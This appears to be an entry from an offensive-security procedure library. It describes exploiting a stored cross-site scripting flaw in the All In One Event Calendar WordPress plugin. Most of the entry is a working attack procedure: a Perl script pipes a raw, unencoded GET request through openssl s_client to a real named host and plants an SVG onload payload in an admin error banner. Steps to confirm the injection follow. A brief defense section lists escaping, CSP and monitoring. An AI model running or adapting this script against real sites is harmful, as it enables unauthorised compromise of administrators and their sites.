---
tags:
  - xss
  - stored-xss
  - injection
  - wordpress
type: procedure
tools:
  - '[[tools/Perl]]'
  - '[[tools/OpenSSL-s-client]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/perl-inject-stored-xss-via-openssl]]'
platforms:
  - Web
  - WordPress
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 0f35785f-b8d2-4bf1-a089-31b875fd3ec5
created_at: '2025-12-14T03:16:25.652Z'
updated_at: '2025-12-14T03:16:25.652Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malformed-HTTP-Request-to-Trigger-Stored-XSS

## Summary

This procedure crafts and sends a malformed HTTPS GET request to the All In One Event Calendar plugin's widget endpoint, exploiting an unfiltered URL parameter to inject a JavaScript XSS payload into a stored error message banner displayed in the WordPress admin dashboard.

## Description

The vulnerability stems from the plugin's exception handler in wp-content/plugins/all-in-one-event-calendar/lib/exception/handler.php, where controllable URL parameters like events_per_page are included in error messages without HTML escaping. By setting events_per_page to a value like "$%&xss=<svg/onload=alert(/stored-xss/.source)>", the request causes an invalid SQL format string error, storing the payload. This requires sending the request without URL encoding, which browsers do automatically, hence the use of a custom Perl script with OpenSSL for raw HTTPS transmission. The target is a WordPress site with the plugin enabled, accessible via HTTPS on port 443.

## Requirements

1. Network access to the target domain (e.g., drive.uber.com:443)
2. Perl and OpenSSL installed on the attacker's system
3. Knowledge of the calendar widget endpoint (/oh/ with ai1ec_js_widget parameter)

## Defense

Defensive measures and detection strategies:

- Input validation and HTML escaping in plugin error handlers
- Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous HTTP requests with unencoded special characters in query parameters
- Disable or update vulnerable plugins like All In One Event Calendar

## Objectives

1. Trigger SQL format string error to store XSS payload
2. Ensure payload injection without encoding for execution
3. Prepare for admin dashboard compromise upon viewing

## Instructions

### Step 1: Prepare and Execute Injection Script

**Context**: Craft a Perl script to pipe the raw HTTP request through OpenSSL for HTTPS without encoding the payload.

**Command** ([[commands/perl-inject-stored-xss-via-openssl]]):
```perl
#!/usr/bin/perl
open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;
print NC "GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";
print NC "HTTP/1.1\r\n";
print NC "Host: drive.uber.com\r\n";
print NC "\r\n";
close(NC);
```

> This script connects to the target via HTTPS, sends the GET request with the malformed events_per_page parameter containing the SVG-based XSS payload, and closes the connection. Expected output is an HTTP 302 redirect, confirming the error trigger and payload storage.

### Step 2: Verify Injection Response

**Context**: Check the response to ensure the plugin processed the error without immediate failure.

**Command** (No specific command; inspect output):
```bash
# Run the Perl script and observe response headers
```

> Look for a 302 Location header redirecting to the front page, indicating successful error handling and storage.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/perl-inject-stored-xss-via-openssl]]

## Tools Used

- [[tools/Perl]]
- [[tools/OpenSSL-s-client]]

## Tags

- xss
- stored-xss
- injection
